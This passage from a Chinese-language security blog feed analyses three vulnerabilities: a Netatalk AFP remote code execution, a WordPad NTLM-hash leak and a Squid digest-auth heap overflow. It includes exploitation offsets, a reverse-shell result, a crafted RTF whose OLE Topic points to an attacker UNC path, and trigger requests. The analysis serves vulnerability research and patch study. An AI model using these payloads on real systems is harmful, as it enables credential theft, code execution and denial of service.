+ 0x20</code> 内，而在分配大小小于<code>0x1000</code>情况下，<code>mmap</code>函数分配的内存刚好在<code>data</code>段上面，此时<code>mmap</code>分配的内存地址距离要覆盖的<code>_dl_load_lock</code> 参数为<code>0x2968</code>，以此可得<code>ad.ADEID_FINDERI.off=0x2940</code></p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$7<span style="color:#f92672">=</span><span style="color:#f92672">(</span>__rtld_lock_recursive_t *<span style="color:#f92672">)</span> 0x7efeac865968 &lt;_rtld_global+2312></span></span><span style="display:flex;"><span>gef➤ p &amp;_rtld_global._dl_load_lock Quit</span></span><span style="display:flex;"><span>gef➤ p 0x7efeac865968 - 0x7efeac863000</span></span><span style="display:flex;"><span>$8<span style="color:#f92672">=</span> 0x2968</span></span></code></pre></div><p>同时还要覆盖到<code>__rtld_lock_lock_recursive</code> 函数指针，测算可得至少需要复制<code>0x600</code>的长度才能覆盖到函数指针，此处可以设置复制长度为0x620</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gef➤ p &amp;_rtld_global._dl_rtld_lock_recursive</span></span><span style="display:flex;"><span>$10<span style="color:#f92672">=</span><span style="color:#f92672">(</span>void<span style="color:#f92672">(</span>**<span style="color:#f92672">)(</span>void *<span style="color:#f92672">))</span> 0x7efeac865f68 &lt;_rtld_global+3848></span></span><span style="display:flex;"><span>gef➤ p 0x7efeac865f68 - 0x7efeac863000</span></span><span style="display:flex;"><span>$11<span style="color:#f92672">=</span> 0x2f68</span></span><span style="display:flex;"><span>gef➤ p 0x2f68 - 0x2968</span></span><span style="display:flex;"><span>$12<span style="color:#f92672">=</span> 0x600</span></span></code></pre></div><p>利用上述偏移，加上计算得到的<code>system</code>函数地址，生成可用文件，如下：</p><p><img alt="" src="/images/vulnerability/CVE-2022-23121-AFP-RCE.zh-cn.assets/29.png"/></p><p><img alt="" src="/images/vulnerability/CVE-2022-23121-AFP-RCE.zh-cn.assets/30.png"/></p><p>此时在目标主机内已有了该定时任务，在攻击机上监听2333端口即可收到反弹的<code>shell</code></p><p><img alt="" src="/images/vulnerability/CVE-2022-23121-AFP-RCE.zh-cn.assets/31.png"/></p><h3 id="补丁分析">补丁分析</h3><p>在Netatalk3.1.13版本中修复了该漏洞，在新版本中，先检查if中的条件而后给ad指向的结构体赋值，如果if中条件为真，也就是可能发生了越界则直接打印错误消息而后return -1，只有if条件不满足才继续赋值，从而防止了adouble结构体含有不正确的偏移，在外层函数获取到的偏移在范围内从而修复了该漏洞。</p><p><img alt="" src="/images/vulnerability/CVE-2022-23121-AFP-RCE.zh-cn.assets/32.png"/></p><h3 id="函数解释">函数解释</h3><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#f92672">**</span><span style="color:#66d9ef">void</span><span style="color:#f92672">**</span><span style="color:#f92672">*</span><span style="color:#a6e22e">memmove</span> (<span style="color:#f92672">**</span><span style="color:#66d9ef">void</span><span style="color:#f92672">**</span><span style="color:#f92672">*</span>__dest,<span style="color:#f92672">**</span><span style="color:#66d9ef">const</span><span style="color:#f92672">**</span><span style="color:#f92672">**</span><span style="color:#66d9ef">void</span><span style="color:#f92672">**</span><span style="color:#f92672">*</span>__src, size_t __n)</span></span><span style="display:flex;"><span><span style="color:#75715e">// dest指向要复制的目标内存，src指向要复制的数据内存，n为要复制的大小（字节）</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// 如果dest和src指向的内存重叠，该函数仍然可以正常处理，逻辑如下</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/></span></span><span style="display:flex;"><span><span style="color:#66d9ef">char</span> str[]<span style="color:#f92672">=</span><span style="color:#e6db74">"memmove can be very useful......"</span>;</span></span><span style="display:flex;"><span>memmove (str<span style="color:#f92672">+</span><span style="color:#ae81ff">20</span>,str<span style="color:#f92672">+</span><span style="color:#ae81ff">15</span>,<span style="color:#ae81ff">11</span>);</span></span><span style="display:flex;"><span><span style="color:#75715e">// 输出为 memmove can be very very useful.</span></span></span></code></pre></div><p><img alt="" src="/images/vulnerability/CVE-2022-23121-AFP-RCE.zh-cn.assets/72fq1gp2.bmp"/></p><h3 id="参考链接">参考链接</h3><blockquote><p><a href="https://code.woboq.org/userspace/glibc/elf/dl-open.c.html#_dl_open" target="_blank">https://code.woboq.org/userspace/glibc/elf/dl-open.c.html#_dl_open</a></p><p><a href="https://nosec.org/home/detail/4997.html" target="_blank">https://nosec.org/home/detail/4997.html</a></p><p><a href="https://research.nccgroup.com/2022/03/24/remote-code-execution-on-western-digital-pr4100-nas-cve-2022-23121/" target="_blank">https://research.nccgroup.com/2022/03/24/remote-code-execution-on-western-digital-pr4100-nas-cve-2022-23121/</a></p></blockquote><p><strong>Created at 2023-11-23T10:46:28+08:00</strong></p></description></item><item><title>CVE-2023-36563 Wordpad Info Disclosure 分析</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-36563-wordpad-info-disclosure/</link><pubDate>Tue, 31 Oct 2023 17:12:19 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-36563-wordpad-info-disclosure/</guid><description><h3 id="基本信息">基本信息</h3><p>wordpad在解析rtf文件包含的ole对象时会尝试访问Linked object的Topic指向的文件，如果Topic是一个UNC路径则会尝试通过网络访问，并尝试使用NTLM认证，导致泄露NTLM hash。</p><h3 id="影响版本">影响版本</h3><p>略</p><h3 id="环境搭建">环境搭建</h3><ul><li>windows 10 21h2 2023-09补丁</li></ul><h3 id="技术分析调试">技术分析&amp;调试</h3><p>初次看这个漏洞，直觉上很类似今年4月份的在野利用漏洞<a href="/zh-cn/vulnerability/cve-2023-23397-outlook-eop/">CVE-2023-23397 outlook 权限提升漏洞</a>，都是泄露NTLM hash，该漏洞也可能是在某种文件的某个属性使用了UNC路径，使得wordpad加载远程资源，造成NTLM hash泄露。</p><p><strong>补丁diff</strong></p><p>diff wordpad.exe，可以看到修改了如下函数<img alt="" src="/images/vulnerability/CVE-2023-36563-wordpad-info-disclosure.zh-cn.assets/1.png"/></p><p>同时在修复后的wordpad.exe中新增了QueryConvertOLELinkCallback函数和_LoadImageWithWIC_0，根据微软的函数命名规则，QueryConvertOLELinkCallback可能用于查询并转换OLE链接回调函数，比较符合我们的猜测。<img alt="" src="/images/vulnerability/CVE-2023-36563-wordpad-info-disclosure.zh-cn.assets/2.png"/></p><p>附上AI解释<img alt="" src="/images/vulnerability/CVE-2023-36563-wordpad-info-disclosure.zh-cn.assets/5.png"/></p><p>对比各个修改后的函数，可以看出LoadImageResource为加载Image的资源节里面的资源，不是很符合我们之前的假设<img alt="" src="/images/vulnerability/CVE-2023-36563-wordpad-info-disclosure.zh-cn.assets/3.png"/></p><p>回到补丁新增的函数中，对于新增的函数QueryConvertOLELineCallback，其在CRichEdit2View::OnCreate函数中调用，在diff中可以看到补丁中将该函数作为回调函数指针传递给了SendMessageW，目标窗口可以取出这个回调函数指针并调用</p><p><img alt="" src="/images/vulnerability/CVE-2023-36563-wordpad-info-disclosure.zh-cn.assets/4.png"/></p><p><img alt="" src="/images/vulnerability/CVE-2023-36563-wordpad-info-disclosure.zh-cn.assets/6.png"/></p><p>分析到这可以猜测是wordpad打开OLE对象时，将某个属性作为UNC路径进行了解析并访问，导致NTLM hash泄露。
ole对象相关功能由ole32.dll实现，diff ole32.dll，主要修改了如下函数</p><ul><li>OLESTREAMToGenericObject</li><li>wConvertOLESTREAMToIStorage</li><li>OleConvertOLESTREAMToIStorage</li><li>OleConvertOLESTREAMToIStorageEx<img alt="" src="/images/vulnerability/CVE-2023-36563-wordpad-info-disclosure.zh-cn.assets/7.png"/></li></ul><p>新增了如下函数</p><ul><li>IsAppExcludedFromOLELinkConversionRegistrySetting</li><li>CheckOLELinkConversionRegistrySetting</li><li>FindStringInMultiString</li><li>OleConvertOLESTREAMToIStorage2</li><li>OleConvertOLESTREAMToIStorageEx2<img alt="" src="/images/vulnerability/CVE-2023-36563-wordpad-info-disclosure.zh-cn.assets/10.png"/></li></ul><p>在OLESTREAMToGenericObject函数diff中可以看到调用了wordpad中传递的函数指针QueryConvertOLELineCallback，并使用PrependUNCName将szUNC添加UNC路径后赋给a2->m_szTopic。<img alt="" src="/images/vulnerability/CVE-2023-36563-wordpad-info-disclosure.zh-cn.assets/9.png"/></p><p>因此可以得出结论：该漏洞是将ole对象的m_szTopic作为UNC路径进行访问。</p><p>谷歌搜索OLESTREAMToGenericObject，在其他安全研究员发表的<a href="https://ti.qianxin.com/blog/articles/cve-2017-11882-exploit-kit-sample/" target="_blank">其他ole漏洞分析</a>中看到了如下</p><p><img alt="" src="/images/vulnerability/CVE-2023-36563-wordpad-info-disclosure.zh-cn.assets/8.png"/></p><p>OLE格式可以在<a href="https://winprotocoldoc.blob.core.windows.net/productionwindowsarchives/MS-OLEDS/%5bMS-OLEDS%5d.pdf" target="_blank">OLD微软官方文档</a>中看到，FormatID标识了ole对象类型，根据之前的分析可以知道是LinkedObject导致了该漏洞的产生。<img alt="" src="/images/vulnerability/CVE-2023-36563-wordpad-info-disclosure.zh-cn.assets/11.png"/></p><p>根据<a href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-oleds/ce565b68-101d-4af3-88fa-39c28d79fc11#gt_cfc45e76-9219-4c47-9ef2-5832a172f795" target="_blank">微软文档</a>，LinkedObject是单独的源文件中的对象。如果源文件中的对象发生更改，则文档中的对象将自动更新以反映这些更改。</p><blockquote><p><strong>linked object</strong>: An object that is inserted into a document and continues to exist in a separate source file. If the object in the source file changes, the object in the document is updated automatically to reflect those changes.</p></blockquote><p>通过wordpad创建一个rtf文件并嵌入ole对象，使用编辑器打开可以看到如下，根据文档可知该ole对象类型为EmbedObject</p><pre tabindex="0"><code>{\rtf1\ansi\ansicpg54936\deff0\nouicompat\deflang1033\deflangfe2052{\fonttbl{\f0\fnil\fcharset134 \'cb\'ce\'cc\'e5;}}
{\*\generator Riched20 10.0.19041}\viewkind4\uc1
\pard\sa200\sl276\slmult1\f0\fs22\lang2052 fff{\object\objemb{\*\objclass PBrush}\objw2835\objh2835{\*\objdata
01050000
02000000
07000000
50427275736800
00000000
00000000
a0a30100
424d8ea30100000000003600000028000000bd000000bd000000010018000000000058a3010000
000000000000000000000000000000ffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</code></pre><p>下载<a href="https://github.com/decalage2/oletools" target="_blank">ole tools</a>，查看wordpad生成的rtf文件信息</p><pre tabindex="0"><code>➜ rtfobj.exe .\test.rtf
rtfobj 0.60.1 on Python 3.9.6 - http://decalage.info/python/oletools
THIS IS WORK IN PROGRESS - Check updates regularly!
Please report any issue at https://github.com/decalage2/oletools/issues
===============================================================================
File: '.\\test.rtf' - size: 661865 bytes
---+----------+---------------------------------------------------------------
id |index |OLE Object
---+----------+---------------------------------------------------------------
0 |00000118h |format_id: 2 (Embedded)
| |class name: b'PBrush'
| |data size: 107424
| |MD5 = '6eb1e875d3759af5e4b65cd324182471'
---+----------+---------------------------------------------------------------</code></pre><p>我们知道Topic属性是触发漏洞的关键，通过查看ole文档找到了关键信息，如果LinkedObject包含了ObjectHeader结构，则TopicName必须包含指向链接的文件路径，这个路径必须是绝对路径或者是UNC路径<img alt="" src="/images/vulnerability/CVE-2023-36563-wordpad-info-disclosure.zh-cn.assets/12.png"/></p><p>所以我们可以将UNC路径设置为我们的恶意服务器，重新构造rtf文件，成功触发</p><pre tabindex="0"><code>{\rtf1\ansi\ansicpg54936\deff0\nouicompat\deflang1033\deflangfe2052{\fonttbl{\f0\fnil\fcharset134 \'cb\'ce\'cc\'e5;}}
{\*\generator Riched20 10.0.19041}{\*\mmathPr\mdispDef1\mwrapIndent1440 }\viewkind4\uc1
\pard\sa200\sl276\slmult1\f0\fs22\lang2052{\object\objemb{\*\objclass Word.Document.8}\objw585\objh795{\*\objdata
01050000
01000000
10000000
576f72642e446f63756d656e742e3800
17000000
5c5c3139322e3136382e35322e3135365c312e72746600
00000000
00000000
00000000
00000000
01050000
05000000
10000000
576f72642e446f63756d656e742e3800
0e000000
74400000
0100090000033a20000009001610000000001610000026060f002220574d464301000000000001</code></pre><p><img alt="" src="/images/vulnerability/CVE-2023-36563-wordpad-info-disclosure.zh-cn.assets/14.png"/><img alt="" src="/images/vulnerability/CVE-2023-36563-wordpad-info-disclosure.zh-cn.assets/13.png"/></p><p>注意到即使设置了MotW，虽然wordpad会显示警告，但仍然会访问Topic指向的资源，在procmonitor中可以看到如下事件<img alt="" src="/images/vulnerability/CVE-2023-36563-wordpad-info-disclosure.zh-cn.assets/15.png"/></p><p><strong>补丁和缓解措施分析</strong></p><p>微软在补丁日后发布了<a href="https://support.microsoft.com/en-us/topic/kb5032314-how-to-manage-the-ole-object-conversion-vulnerability-associated-with-cve-2023-36563-98d95ae9-2f9e-4f65-9231-46363c31cf07" target="_blank">一篇文章</a>，指出可以在<code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Ole\AppCompat\OLELinkConversionFromOLESTREAMToIStorage</code>中添加DWORD的Disabled值0x00000001来禁用，但我在win 10 21h2 9月补丁中应用了此方法，但不起作用，wordpad没有读取这个注册表。打开文件后仍然访问了UNC路径，泄露了NTLM hash</p><p>在前文补丁分析中已知，wordpad会传递回调函数给ole32一个回调函数，在ole32中，会先检查注册表是否禁用了ole对象链接转换，而后检查当前进程是否在白名单内，最后而后调用用户提供的回调函数，以运行用户自定义的规则。</p><p><strong>PoC构造</strong></p><p>打开wordpad，插入一个rtf对象，而后将Topic的长度和name字段替换为UNC路径即可，稍晚俩天poc会公布在我的GitHub</p><pre tabindex="0"><code>https://github.com/Chestnuts4/POC</code></pre><h3 id="小结">小结</h3><p>这个漏洞和预想中一样，是由于某个属性可以被设置为UNC路径，而后wordpad会访问这个UNC路径，虽然文件设置了MotW标识，wordpad显示了警告，但反常的是wordpad仍然在用户没有同意的情况下访问了目标UNC路径，这一点比较反直觉。</p><p><strong>参考链接</strong></p><blockquote><p><a href="https://securityonline.info/poc-released-for-microsoft-wordpad-cve-2023-36563-flaw-exploited-in-attacks/" target="_blank">https://securityonline.info/poc-released-for-microsoft-wordpad-cve-2023-36563-flaw-exploited-in-attacks/</a></p><p><a href="https://www.dillonfrankesecurity.com/posts/cve-2023-36563-wordpad-analysis/" target="_blank">https://www.dillonfrankesecurity.com/posts/cve-2023-36563-wordpad-analysis/</a></p></blockquote><p><strong>Created at 2023-10-31T17:12:19+08:00</strong></p></description></item><item><title>Squid 拒绝服务漏洞分析</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/squid-dos/</link><pubDate>Thu, 26 Oct 2023 10:41:55 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/vulnerability/squid-dos/</guid><description><h3 id="基本信息">基本信息</h3><p>开启了digest身份认证的squid代理服务器存在堆溢出漏洞，未经身份验证的攻击者可以利用该漏洞造成拒绝服务。</p><h4 id="指纹">指纹</h4><p>hunter</p><pre tabindex="0"><code>web.title="ERROR The requested URL could not be retrieved"</code></pre><h3 id="影响版本">影响版本</h3><p>squid</p><pre tabindex="0"><code>3.2.0.1-5.9, 6.0-6.3</code></pre><h3 id="环境搭建">环境搭建</h3><p>按照configure脚本的提示安装各个依赖，而后执行如下：</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>export C_INCLUDE_PATH<span style="color:#f92672">=</span>/usr/include/libxml2</span></span><span style="display:flex;"><span>export CPLUS_INCLUDE_PATH<span style="color:#f92672">=</span>/usr/include/libxml2</span></span><span style="display:flex;"><span>./configure<span style="color:#e6db74">'--build=x86_64-linux-gnu'</span><span style="color:#e6db74">'--prefix=/root/squid/squid-6.3/build'</span><span style="color:#e6db74">'--includedir=${prefix}/include'</span><span style="color:#e6db74">'--mandir=${prefix}/share/man'</span><span style="color:#e6db74">'--infodir=${prefix}/share/info'</span><span style="color:#e6db74">'--sysconfdir=/etc'</span><span style="color:#e6db74">'--localstatedir=/var'</span><span style="color:#e6db74">'--disable-option-checking'</span><span style="color:#e6db74">'--disable-silent-rules'</span><span style="color:#e6db74">'--libdir=${prefix}/lib/x86_64-linux-gnu'</span><span style="color:#e6db74">'--runstatedir=/run'</span><span style="color:#e6db74">'--disable-maintainer-mode'</span><span style="color:#e6db74">'--disable-dependency-tracking'</span><span style="color:#e6db74">'BUILDCXXFLAGS=-g -O2 -ffile-prefix-map=/build/reproducible-path/squid-6.3=. -fstack-protector-strong -fstack-clash-protection -Wformat -Werror=format-security -fcf-protection -Wno-error=deprecated-declarations -Wdate-time -D_FORTIFY_SOURCE=2 -Wl,-z,relro -Wl,-z,now '</span><span style="color:#e6db74">'BUILDCXX=g++'</span><span style="color:#e6db74">'--with-build-environment=default'</span><span style="color:#e6db74">'--enable-build-info=Debian linux'</span><span style="color:#e6db74">'--datadir=/usr/share/squid'</span><span style="color:#e6db74">'--sysconfdir=/etc/squid'</span><span style="color:#e6db74">'--libexecdir=/usr/lib/squid'</span><span style="color:#e6db74">'--mandir=/usr/share/man'</span><span style="color:#e6db74">'--enable-inline'</span><span style="color:#e6db74">'--disable-arch-native'</span><span style="color:#e6db74">'--enable-async-io=8'</span><span style="color:#e6db74">'--enable-storeio=ufs,aufs,diskd,rock'</span><span style="color:#e6db74">'--enable-removal-policies=lru,heap'</span><span style="color:#e6db74">'--enable-delay-pools'</span><span style="color:#e6db74">'--enable-icap-client'</span><span style="color:#e6db74">'--enable-follow-x-forwarded-for'</span><span style="color:#e6db74">'--enable-auth-basic=DB,fake,getpwnam,LDAP,NCSA,PAM,POP3,RADIUS,SASL,SMB'</span><span style="color:#e6db74">'--enable-auth-digest=file,LDAP'</span><span style="color:#e6db74">'--enable-auth-negotiate=wrapper'</span><span style="color:#e6db74">'--enable-auth-ntlm=fake,SMB_LM'</span><span style="color:#e6db74">'--enable-external-acl-helpers=file_userip,LDAP_group,SQL_session,unix_group,wbinfo_group'</span><span style="color:#e6db74">'--enable-security-cert-validators=fake'</span><span style="color:#e6db74">'--enable-storeid-rewrite-helpers=file'</span><span style="color:#e6db74">'--enable-url-rewrite-helpers=fake'</span><span style="color:#e6db74">'--enable-eui'</span><span style="color:#e6db74">'--enable-esi'</span><span style="color:#e6db74">'--enable-zph-qos'</span><span style="color:#e6db74">'--disable-translation'</span><span style="color:#e6db74">'--with-swapdir=/var/spool/squid'</span><span style="color:#e6db74">'--with-logdir=/var/log/squid'</span><span style="color:#e6db74">'--with-pidfile=/run/squid.pid'</span><span style="color:#e6db74">'--with-filedescriptors=65536'</span><span style="color:#e6db74">'--with-large-files'</span><span style="color:#e6db74">'--with-default-user=proxy'</span><span style="color:#e6db74">'--enable-linux-netfilter'</span><span style="color:#e6db74">'--without-systemd'</span><span style="color:#e6db74">'--with-gnutls'</span><span style="color:#e6db74">'build_alias=x86_64-linux-gnu'</span><span style="color:#e6db74">'CFLAGS=-g -O2 -ffile-prefix-map=/build/reproducible-path/squid-6.3=. -fstack-protector-strong -fstack-clash-protection -Wformat -Werror=format-security -fcf-protection -Wno-error=deprecated-declarations'</span><span style="color:#e6db74">'LDFLAGS=-Wl,-z,relro -Wl,-z,now '</span><span style="color:#e6db74">'CPPFLAGS=-Wdate-time -D_FORTIFY_SOURCE=2'</span><span style="color:#e6db74">'CXXFLAGS=-g -O2 -ffile-prefix-map=/build/reproducible-path/squid-6.3=. -fstack-protector-strong -fstack-clash-protection -Wformat -Werror=format-security -fcf-protection -Wno-error=deprecated-declarations'</span><span style="color:#e6db74">'--disable-optimizations'</span></span></span></code></pre></div><p>配置在squid.conf添加如下</p><pre tabindex="0"><code class="language-conf" data-lang="conf">auth_param digest program /usr/lib/squid/digest_file_auth -c /etc/squid/password.digest
auth_param digest realm localhost
acl authenticated proxy_auth REQUIRED
http_access allow authenticated
http_port 3128
test:localhost:39df1982ed1fef9f74ecd670a2a93c66</code></pre><p>使用如下请求触发</p><pre tabindex="0"><code>curl -i -k http://116.62.202.230 -x 192.168.59.197:3128 -U test:123456 --proxy-digest</code></pre><h3 id="技术分析调试">技术分析&amp;调试</h3><p><strong>补丁分析</strong></p><p>补丁修复于<code>src\auth\digest\Config.cc</code>，可以看出补丁主要是对value.size进行了判断，在修复前虽然判断了value.size()是否为8，但仅仅打印了一条调试信息，后面仍然调用xstrncpy进行复制。
在补丁处如果nc参数不是8则不会调用xstrncpy进行复制。<img alt="" src="/images/vulnerability/squid-dos.zh-cn.assets/1.png"/></p><p>而xstrncpy要写入的长度参数来源于value.size()，value是一个String类型变量</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">case</span> DIGEST_NC:</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (value.<span style="color:#a6e22e">size</span>()<span style="color:#f92672">!=</span><span style="color:#ae81ff">8</span>) {</span></span><span style="display:flex;"><span><span style="color:#a6e22e">debugs</span>(<span style="color:#ae81ff">29</span>,<span style="color:#ae81ff">9</span>,<span style="color:#e6db74">"Invalid nc '"</span><span style="color:#f92672">&lt;&lt;</span> value<span style="color:#f92672">&lt;&lt;</span><span style="color:#e6db74">"' in '"</span><span style="color:#f92672">&lt;&lt;</span> temp<span style="color:#f92672">&lt;&lt;</span><span style="color:#e6db74">"'"</span>);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#a6e22e">xstrncpy</span>(digest_request<span style="color:#f92672">-></span>nc, value.<span style="color:#a6e22e">rawBuf</span>(), value.<span style="color:#a6e22e">size</span>()<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>);</span></span><span style="display:flex;"><span><span style="color:#a6e22e">debugs</span>(<span style="color:#ae81ff">29</span>,<span style="color:#ae81ff">9</span>,<span style="color:#e6db74">"Found noncecount '"</span><span style="color:#f92672">&lt;&lt;</span> digest_request<span style="color:#f92672">-></span>nc<span style="color:#f92672">&lt;&lt;</span><span style="color:#e6db74">"'"</span>);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">break</span>;</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">char</span><span style="color:#f92672">*</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">xstrncpy</span>(<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>dst,<span style="color:#66d9ef">const</span><span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>src,<span style="color:#66d9ef">size_t</span> n)</span></span><span style="display:flex;"><span>{</span></span><span style="display:flex;"><span><span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>r<span style="color:#f92672">=</span> dst;</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>n<span style="color:#f92672">||</span><span style="color:#f92672">!</span>dst)</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> dst;</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (src)</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> (<span style="color:#f92672">--</span>n<span style="color:#f92672">!=</span><span style="color:#ae81ff">0</span><span style="color:#f92672">&amp;&amp;</span><span style="color:#f92672">*</span>src<span style="color:#f92672">!=</span><span style="color:#e6db74">'\0'</span>) {</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>dst<span style="color:#f92672">=</span><span style="color:#f92672">*</span>src;</span></span><span style="display:flex;"><span><span style="color:#f92672">++</span>dst;</span></span><span style="display:flex;"><span><span style="color:#f92672">++</span>src;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#f92672">*</span>dst<span style="color:#f92672">=</span><span style="color:#e6db74">'\0'</span>;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> r;</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><p>可以看出这是一个越界写漏洞，可以造成堆溢出。<strong>动态调试</strong></p><p>断点如下</p><pre tabindex="0"><code>gef➤ b Auth::Digest::Config::decode
gef➤ b Config.cc:829</code></pre><p>通过curl触发断点</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -i -k http://host -x 192.168.59.197:3128 -U test:123456 --proxy-digest</span></span></code></pre></div><p>此时调用栈如下</p><pre tabindex="0"><code>gef➤ bt
#0 Auth::Digest::Config::decode (this=0x55a2e598a470,
proxy_auth=0x55a2e5cc50e7 "username=\"test\",realm=\"localhost\",nonce=\"52a18c55ec2a173b665ae8c4d1b947b6\",uri=\"/\",cnonce=\"b315dc470396be779b18a73909a139f1\",nc=00000001,response=\"edda2d0982c717bd74ad9989da11b158\",qop=\"auth\"",
request=0x55a2e61210e0, aRequestRealm=0x0) at Config.cc:830
#1 0x000055a2e483a895 in Auth::SchemeConfig::CreateAuthUser (
proxy_auth=0x55a2e5cc50e0 "Digest username=\"test\",realm=\"localhost\",nonce=\"52a18c55ec2a173b665ae8c4d1b947b6\",uri=\"/\",cnonce=\"b315dc470396be779b18a73909a139f1\",nc=00000001,response=\"edda2d0982c717bd74ad9989da11b158\",qop=\"auth\"", al=...)
at SchemeConfig.cc:55
#2 0x000055a2e4840d94 in Auth::UserRequest::authenticate (auth_user_request=0x55a2e611ee20,
headertype=Http::PROXY_AUTHORIZATION, request=0x55a2e61210e0, conn=0x55a2e6118e78, src_addr=..., al=...) at UserRequest.cc:354
#3 0x000055a2e4841952 in Auth::UserRequest::tryToAuthenticateAndSetAuthUser (aUR=0x55a2e611ee20,
headertype=Http::PROXY_AUTHORIZATION, request=0x55a2e61210e0, conn=0x55a2e6118e78, src_addr=..., al=...) at UserRequest.cc:453
#4 0x000055a2e4807766 in AuthenticateAcl (ch=0x55a2e611ec88) at Acl.cc:57
#5 0x000055a2e4809a2d in ACLProxyAuth::match (this=0x55a2e598ac40, checklist=0x55a2e611ec88) at AclProxyAuth.cc:55
#6 0x000055a2e4861813 in ACL::matches (this=0x55a2e598ac40, checklist=0x55a2e611ec88) at Acl.cc:171
#7 0x000055a2e4866b75 in ACLChecklist::matchChild (this=0x55a2e611ec88, current=0x55a2e598bc50, pos=0x55a2e598ac40,
child=0x55a2e598ac40) at Checklist.cc:93
#8 0x000055a2e4866018 in Acl::AndNode::doMatch (this=0x55a2e598bc50, checklist=0x55a2e611ec88, start=0x55a2e598ac40)
at BoolOps.cc:76
#9 0x000055a2e486af59 in Acl::InnerNode::match (this=0x55a2e598bc50, checklist=0x55a2e611ec88) at InnerNode.cc:91
#10 0x000055a2e4861813 in ACL::matches (this=0x55a2e598bc50, checklist=0x55a2e611ec88) at Acl.cc:171
#11 0x000055a2e4866b75 in ACLChecklist::matchChild (this=0x55a2e611ec88, current=0x55a2e598c098, pos=0x55a2e598bc50,
child=0x55a2e598bc50) at Checklist.cc:93
#12 0x000055a2e4866198 in Acl::OrNode::doMatch (this=0x55a2e598c098, checklist=0x55a2e611ec88, start=0x55a2e598bc50)
at BoolOps.cc:114
#13 0x000055a2e486af59 in Acl::InnerNode::match (this=0x55a2e598c098, checklist=0x55a2e611ec88) at InnerNode.cc:91
#14 0x000055a2e4861813 in ACL::matches (this=0x55a2e598c098, checklist=0x55a2e611ec88) at Acl.cc:171
#15 0x000055a2e4867883 in ACLChecklist::matchAndFinish (this=0x55a2e611ec88) at Checklist.cc:295
#16 0x000055a2e4867691 in ACLChecklist::nonBlockingCheck (this=0x55a2e611ec88,
callback_=0x55a2e4749b13 &lt;clientAccessCheckDoneWrapper(Acl::Answer, void*)>, callback_data_=0x55a2e611e8b8)
at Checklist.cc:254
#17 0x000055a2e47498dc in ClientRequestContext::clientAccessCheck (this=0x55a2e611e8b8) at client_side_request.cc:660
#18 0x000055a2e474da2d in ClientHttpRequest::doCallouts (this=0x55a2e6119ce8) at client_side_request.cc:1704
#19 0x000055a2e4748ec8 in ClientRequestContext::hostHeaderVerify (this=0x55a2e611e8b8) at client_side_request.cc:608
#20 0x000055a2e474d8ff in ClientHttpRequest::doCallouts (this=0x55a2e6119ce8) at client_side_request.cc:1697
#21 0x000055a2e4727ff3 in clientProcessRequest (conn=0x55a2e6118e78, hp=..., context=0x55a2e611a740) at client_side.cc:1759
#22 0x000055a2e48b338e in Http::One::Server::processParsedRequest (this=0x55a2e6118e78, context=...) at Http1Server.cc:284
#23 0x000055a2e4729260 in ConnStateData::clientParseRequests (this=0x55a2e6118e78) at client_side.cc:1948
#24 0x000055a2e472961a in ConnStateData::afterClientRead (this=0x55a2e6118e78) at client_side.cc:1982
